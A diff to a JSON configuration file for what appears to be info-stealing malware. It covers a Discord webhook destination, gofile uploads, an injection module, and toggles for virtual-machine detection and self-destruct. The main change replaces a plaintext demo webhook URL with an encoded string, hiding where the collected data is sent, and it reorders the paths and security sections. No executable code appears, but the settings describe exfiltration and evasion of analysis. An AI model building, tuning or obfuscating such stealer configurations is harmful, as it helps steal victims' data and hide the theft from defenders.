@@ -5,17 +5,21 @@
     "environment": "development"
   },
   "webhook": {
-    "url": "https://discord.com/api/webhooks/demo/plain-text-demo-webhook",
+    "url": "ZmJt0MC92hKhRZheEkc76wXuN559Hkofl1QLthfFMzAxCk/yrje28iCZyUbBfbA0KkNb3C47DHMIIcZjTy+SrZbxCjGDudwUnXSSOLa9rknOE0F2EL/Hxyk=",
     "timeout": 30000
+  },
+  "paths": {
+    "temp": "/tmp",
+    "output": "./output"
   },
   "upload": {
     "enabled": true,
     "service": "gofile",
     "maxSize": 7340032
   },
-  "paths": {
-    "temp": "/tmp",
-    "output": "./output"
+  "security": {
+    "enableVmDetection": false,
+    "enableSelfDestruct": false
   },
   "modules": {
     "enabled": {
@@ -26,9 +30,5 @@
       "system": true,
       "injection": false
     }
-  },
-  "security": {
-    "enableVmDetection": false,
-    "enableSelfDestruct": false
   }
 }
